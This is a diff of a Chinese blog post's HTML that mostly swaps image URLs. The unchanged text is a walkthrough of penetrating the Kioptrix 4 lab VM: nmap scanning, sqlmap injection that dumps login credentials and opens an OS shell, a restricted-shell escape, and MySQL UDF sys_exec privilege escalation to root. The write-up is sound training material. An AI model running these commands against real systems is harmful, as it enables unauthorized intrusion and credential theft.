@@ -17,26 +17,26 @@
 <meta property="og:site_name" content="凉生霜气清，月上灯火明">
 <meta property="og:description" content="简介：emmmmm，为了实验满分，记录一次web靶机的渗透流程，非常感谢JKding233大佬的技术支持，给大佬跪了！！！">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://z3.ax1x.com/2020/11/16/DAj47n.png">
-<meta property="og:image" content="https://z3.ax1x.com/2020/11/17/DV564e.png">
-<meta property="og:image" content="https://z3.ax1x.com/2020/11/17/DV523d.png">
-<meta property="og:image" content="https://z3.ax1x.com/2020/11/17/DV5g9H.png">
-<meta property="og:image" content="https://z3.ax1x.com/2020/11/17/DV5yND.png">
-<meta property="og:image" content="https://z3.ax1x.com/2020/11/17/DV5sAO.png">
-<meta property="og:image" content="https://z3.ax1x.com/2020/11/17/DV5RgA.png">
-<meta property="og:image" content="https://z3.ax1x.com/2020/11/17/DV5WjI.png">
-<meta property="og:image" content="https://z3.ax1x.com/2020/11/17/DV55Hf.png">
-<meta property="og:image" content="https://z3.ax1x.com/2020/11/17/DV574g.png">
-<meta property="og:image" content="https://z3.ax1x.com/2020/11/17/DV5oE8.png">
-<meta property="og:image" content="https://z3.ax1x.com/2020/11/17/DV5TUS.png">
-<meta property="og:image" content="https://z3.ax1x.com/2020/11/17/DV5bCQ.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110646.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110650.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110655.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110703.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110708.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110713.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110722.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110727.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110732.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110743.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110750.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110755.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110800.png">
 <meta property="article:published_time" content="2020-11-16T11:50:31.000Z">
-<meta property="article:modified_time" content="2021-04-05T04:57:27.227Z">
+<meta property="article:modified_time" content="2021-04-14T03:08:08.490Z">
 <meta property="article:author" content="foxcookie">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="靶机">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://z3.ax1x.com/2020/11/16/DAj47n.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110646.png">
   
     <link rel="alternative" href="/atom.xml" title="凉生霜气清，月上灯火明" type="application/atom+xml">
   
@@ -208,26 +208,26 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p><strong>简介：</strong>emmmmm，为了实验满分，记录一次web靶机的渗透流程，非常感谢<a target="_blank" rel="noopener" href="https://www.cnblogs.com/JKding233/">JKding233</a>大佬的技术支持，给大佬跪了！！！</p>
-<p><img src="https://z3.ax1x.com/2020/11/16/DAj47n.png" alt="DAj47n.png"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110646.png" alt="a"></p>
 <a id="more"></a>
 
 <h3 id="Kioptrix-4靶机"><a href="#Kioptrix-4靶机" class="headerlink" title="Kioptrix 4靶机"></a>Kioptrix 4靶机</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r <span class="number">192.168</span><span class="number">.7</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://z3.ax1x.com/2020/11/17/DV564e.png" alt="DV564e.png"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110650.png" alt="1"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主机IP：<span class="number">192.168</span><span class="number">.7</span><span class="number">.37</span></span><br><span class="line">MAC：<span class="number">00</span>:0c:<span class="number">29</span>:4a:<span class="number">20</span>:9b</span><br></pre></td></tr></table></figure>
 
 <h4 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV <span class="number">192.168</span><span class="number">.7</span><span class="number">.37</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://z3.ax1x.com/2020/11/17/DV523d.png" alt="DV523d.png"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110655.png" alt="2"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap扫描主机，开启了<span class="number">22</span>、<span class="number">80</span>、<span class="number">139</span>、<span class="number">445</span>端口</span><br><span class="line">OpenSSH版本：<span class="number">4.7</span>p1</span><br><span class="line">Apache版本：<span class="number">2.2</span><span class="number">.8</span></span><br><span class="line">PHP版本：<span class="number">5.2</span><span class="number">.4</span>-<span class="number">2</span></span><br><span class="line">操作系统：Ubuntun</span><br></pre></td></tr></table></figure>
 
 <h4 id="SQL注入测试"><a href="#SQL注入测试" class="headerlink" title="SQL注入测试"></a>SQL注入测试</h4><h5 id="SQL注入测试-1"><a href="#SQL注入测试-1" class="headerlink" title="SQL注入测试"></a>SQL注入测试</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问web页面，弱口令登陆失败（admin；password）</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://z3.ax1x.com/2020/11/17/DV5g9H.png" alt="DV5g9H.png"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110703.png" alt="3"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看提交的表单，使用post提交表单，尝试SQL注入</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://z3.ax1x.com/2020/11/17/DV5yND.png" alt="DV5yND.png"></p>
-<p><img src="https://z3.ax1x.com/2020/11/17/DV5sAO.png" alt="DV5sAO.png"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110708.png" alt="4"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110713.png" alt="5"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">存在SQL注入，且暴露了网站物理路径</span><br></pre></td></tr></table></figure>
 
 <h5 id="列出当前用户、数据库、当前用户是否是dba"><a href="#列出当前用户、数据库、当前用户是否是dba" class="headerlink" title="列出当前用户、数据库、当前用户是否是dba"></a>列出当前用户、数据库、当前用户是否是dba</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用sqlmap进行注入</span><br><span class="line"></span><br><span class="line">sqlmap -u http://<span class="number">192.168</span><span class="number">.7</span><span class="number">.37</span>/checklogin.php --data=<span class="string">&quot;myusername=admin&amp;mypassword=password&amp;Submit=Login&quot;</span> -p mypassword --current-user --current-db --<span class="keyword">is</span>-dba</span><br></pre></td></tr></table></figure>
@@ -236,13 +236,13 @@
 
 <h5 id="列出数据库中的表"><a href="#列出数据库中的表" class="headerlink" title="列出数据库中的表"></a>列出数据库中的表</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~<span class="comment"># sqlmap -u http://192.168.7.37/checklogin.php --data=&quot;myusername=admin&amp;mypassword=password&amp;Submit=Login&quot; -p mypassword --tables -D &quot;members&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://z3.ax1x.com/2020/11/17/DV5RgA.png" alt="DV5RgA.png"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110722.png" alt="6"></p>
 <h5 id="列出表的所有字段"><a href="#列出表的所有字段" class="headerlink" title="列出表的所有字段"></a>列出表的所有字段</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~<span class="comment"># sqlmap -u http://192.168.7.37/checklogin.php --data=&quot;myusername=admin&amp;mypassword=password&amp;Submit=Login&quot; -p mypassword --columns -T &quot;members&quot; -D &quot;members&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://z3.ax1x.com/2020/11/17/DV5WjI.png" alt="DV5WjI.png"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110727.png" alt="7"></p>
 <h5 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~<span class="comment"># sqlmap -u http://192.168.7.37/checklogin.php --data=&quot;myusername=admin&amp;mypassword=password&amp;Submit=Login&quot; -p mypassword --dump-all -T &quot;members&quot; -D &quot;members&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://z3.ax1x.com/2020/11/17/DV55Hf.png" alt="DV55Hf.png"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110732.png" alt="8"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户名和密码</span><br><span class="line">john     | MyNameIsJohn          |</span><br><span class="line">robert   | ADGAdsafdfwt4gadfga== |</span><br></pre></td></tr></table></figure>
 
 <h5 id="利用sqlmap写shell得到数据库名和密码"><a href="#利用sqlmap写shell得到数据库名和密码" class="headerlink" title="利用sqlmap写shell得到数据库名和密码"></a>利用sqlmap写shell得到数据库名和密码</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~<span class="comment"># sqlmap -u http://192.168.7.37/checklogin.php --data=&quot;myusername=admin&amp;mypassword=password&amp;Submit=Login&quot; -p mypassword --os-shell</span></span><br></pre></td></tr></table></figure>
@@ -253,13 +253,13 @@
 
 <h5 id="使用获取的用户名和密码尝试ssh连接"><a href="#使用获取的用户名和密码尝试ssh连接" class="headerlink" title="使用获取的用户名和密码尝试ssh连接"></a>使用获取的用户名和密码尝试ssh连接</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password	MyNameIsJohn</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://z3.ax1x.com/2020/11/17/DV574g.png" alt="DV574g.png"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110743.png" alt="9"></p>
 <h5 id="使用shell命令得到一个bash交互shell"><a href="#使用shell命令得到一个bash交互shell" class="headerlink" title="使用shell命令得到一个bash交互shell"></a>使用shell命令得到一个bash交互shell</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://z3.ax1x.com/2020/11/17/DV5oE8.png" alt="DV5oE8.png"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110750.png" alt="10"></p>
 <h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://z3.ax1x.com/2020/11/17/DV5TUS.png" alt="DV5TUS.png"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110755.png" alt="11"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line">use mysql;</span><br><span class="line"></span><br><span class="line">select sys_exec(<span class="string">&#x27;id &gt; /tmp/out; chown john.john /tmp/out&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:~$ mysql -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end <span class="keyword">with</span> ; <span class="keyword">or</span> \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> <span class="keyword">is</span> <span class="number">6109</span></span><br><span class="line">Server version: <span class="number">5.0</span><span class="number">.51</span>a-3ubuntu5<span class="number">.4</span> (Ubuntu)</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the buffer.</span><br><span class="line"></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table <span class="keyword">and</span> column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; select sys_exec(<span class="string">&#x27;id &gt; /tmp/out; chown john.john /tmp/out&#x27;</span>);</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| sys_exec(<span class="string">&#x27;id &gt; /tmp/out; chown john.john /tmp/out&#x27;</span>) |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| NULL                                                | </span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.04</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; quit</span><br><span class="line">Bye</span><br><span class="line">john@Kioptrix4:~$ <span class="built_in">id</span></span><br><span class="line">uid=<span class="number">1001</span>(john) gid=<span class="number">1001</span>(john) groups=<span class="number">115</span>(admin),<span class="number">1001</span>(john)</span><br><span class="line">john@Kioptrix4:~$ cat /tmp/out</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure>
@@ -268,7 +268,7 @@
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:~$ sudo su</span><br><span class="line">[sudo] password <span class="keyword">for</span> john: </span><br><span class="line">root@Kioptrix4:/home/john<span class="comment"># cd /</span></span><br><span class="line">root@Kioptrix4:/<span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line">root@Kioptrix4:/<span class="comment"># </span></span><br><span class="line">root@Kioptrix4:/<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://z3.ax1x.com/2020/11/17/DV5bCQ.png" alt="DV5bCQ.png"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/20210414110800.png" alt="12"></p>
 <h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/b10d9/article/details/108903874">https://blog.csdn.net/b10d9/article/details/108903874</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hzcya1995/p/13302343.html">https://www.cnblogs.com/hzcya1995/p/13302343.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/9030673.html#commentform">https://www.cnblogs.com/litlife/p/9030673.html#commentform</a></p>
@@ -295,7 +295,7 @@
     2020-11-16
     <br>
     <strong class="update-time">最后更新：</strong>
-    2021-04-05
+    2021-04-14
     <br>
     <strong class="article-titles">本文标题：</strong>
     <a href="https://foxcookie.github.io/2020/11/16/Kioptrix-4靶机/" title="Kioptrix 4靶机" target="_blank">Kioptrix 4靶机</a>
